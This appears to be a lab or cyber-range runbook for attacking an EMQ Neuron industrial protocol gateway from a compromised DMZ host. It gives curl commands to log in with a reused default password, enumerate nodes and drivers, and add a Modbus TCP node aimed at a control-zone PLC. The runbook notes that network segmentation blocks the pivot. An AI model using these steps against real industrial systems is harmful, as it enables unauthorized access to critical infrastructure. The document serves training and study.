# Runbook: sorting-office

## Discovery

Port 7000 on 10.10.5.11 is not reachable from the internet zone. After gaining a shell on contractors-gate, a TCP probe
confirms it is open.

```bash
root@contractors-gate:~# nc -zv 10.10.5.11 7000
```

```bash
root@contractors-gate:~# curl -s -X POST http://10.10.5.11:7000/api/v2/ping
```

Returns `{}`. The path structure and response format match Neuron, an industrial protocol gateway from EMQ that
bridges southbound device protocols to a northbound MQTT publisher. The ping endpoint answers without a credential.

## Authentication

Neuron uses JWT tokens. The login endpoint issues them.

```bash
root@contractors-gate:~# curl -s -X POST http://10.10.5.11:7000/api/v2/login \
    -H 'Content-Type: application/json' \
    -d '{"name":"admin","pass":"uupl2015"}'
```

```json
{"token": "eyJ..."}
```

The credential `admin / uupl2015` works. The password is the same one used on contractors-gate; it appears to be the
site-wide default across DMZ services. Extract the token for subsequent calls:

```bash
root@contractors-gate:~# TOKEN=$(curl -s -X POST http://10.10.5.11:7000/api/v2/login \
    -H 'Content-Type: application/json' \
    -d '{"name":"admin","pass":"uupl2015"}' \
    | sed -n 's/.*"token": *"\([^"]*\)".*/\1/p')
```

## Node enumeration

Neuron organises devices into nodes. Type 2 is northbound (data destinations, such as MQTT publishers). Type 1 is
southbound (data sources, such as Modbus devices).

```bash
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    'http://10.10.5.11:7000/api/v2/node?type=2'
```

One northbound node appears: `uupl-mqtt-north`. It publishes to clacks-relay at `10.10.5.12:1883` under the
`/neuron/sorting-office/` topic prefix.

```bash
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    'http://10.10.5.11:7000/api/v2/node?type=1'
```

Returns `{"nodes": []}`. No southbound device is configured by default. The northbound publisher exists but has nothing to forward yet.

## Available drivers

```bash
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    http://10.10.5.11:7000/api/v2/plugin
```

The response lists every installed driver. Southbound plugins of interest here include Modbus TCP, OPC UA,
IEC60870-5-104 standard, and DNP 3.0. Each one can be pointed at a device inside a zone that is not directly
reachable from the current foothold. Sorting-office may have routing paths that contractors-gate does not.

## Adding a southbound device

The API accepts new node definitions from any machine that can reach port 7000. Create a node:

```bash
root@contractors-gate:~# curl -s -X POST http://10.10.5.11:7000/api/v2/node \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"name":"turbine-plc","plugin":"Modbus TCP"}'
```

Configure the target address. The Modbus TCP plugin requires all fields even when defaults are acceptable:

```bash
root@contractors-gate:~# curl -s -X POST http://10.10.5.11:7000/api/v2/node/setting \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"node":"turbine-plc","params":{"connection_mode":0,"host":"10.10.3.21","port":502,"timeout":3000,"check_header":0,"device_degrade":0,"max_retries":0,"retry_interval":0,"endianess":1,"endianess_64":1,"address_base":1,"interval":20}}'
```

The node is created and configured without error, but pointing it at the control zone (10.10.3.21) is only useful if
sorting-office can route there. The default gateway is 10.10.5.201 (`dmz-ent-fw`, the DMZ-to-enterprise router), so any
path to 10.10.3.0/24 runs through enterprise and operational and finally `ops-ctrl-fw`. A direct probe settles it:

```bash
root@contractors-gate:~# nc -zv -w5 10.10.3.21 502
```

The connection times out rather than being refused: the control firewall drops it. Inbound Modbus to the control zone is
permitted only from the engineering workstation (10.10.2.30), so from the DMZ the poll never connects and nothing
reaches `uupl-mqtt-north`. The node sits in a connecting state and clacks-relay stays silent on the Neuron prefix. This
is the misconfiguration surface that does not pay off from here: the gateway can be told to reach the PLC, but the
segmentation between the DMZ and the control zone holds. A foothold that can route to 10.10.3.0/24 would be needed to
make the same node poll succeed.

## Persistence

Configuration changes made through the API persist across service restarts.

## What you can know now

Access:

- Neuron management API at `10.10.5.11:7000`, credential `admin / uupl2015`
- JWT token required for all calls beyond `/ping`

Nodes:

- Northbound: `uupl-mqtt-north`, publishing to `clacks-relay` at `10.10.5.12:1883` under `/neuron/sorting-office/`
- Southbound: empty by default; Modbus TCP, OPC UA, IEC60870-5-104, DNP3 available

Credential reuse:

- `uupl2015` is the contractors-gate root password and the Neuron admin password
